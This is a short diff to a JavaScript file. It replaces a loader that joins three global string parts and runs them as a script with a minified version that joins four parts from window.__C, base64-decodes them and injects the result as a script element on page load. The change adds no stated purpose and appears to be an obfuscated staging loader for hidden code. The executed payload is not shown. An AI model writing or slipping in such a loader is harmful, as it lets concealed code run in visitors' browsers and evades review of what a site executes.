@@ -1,11 +1,1 @@
-(function(){
-  function run(){
-    if(!window.__IVC_PARTS) return;
-    for(var i=0;i<3;i++){ if(typeof window.__IVC_PARTS[i] !== 'string') return; }
-    var s = window.__IVC_PARTS[0]+window.__IVC_PARTS[1]+window.__IVC_PARTS[2];
-    var el = document.createElement('script');
-    el.text = s;
-    document.documentElement.appendChild(el);
-  }
-  run();
-})();
+(function(){var n=4;function go(){if(!window.__C)return;for(var i=0;i<n;i++)if(typeof window.__C[i]!=="string")return;var b64=window.__C.join("");var bin=atob(b64);var u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);var s=new TextDecoder().decode(u);var el=document.createElement("script");el.text=s;document.documentElement.appendChild(el);}go();})();
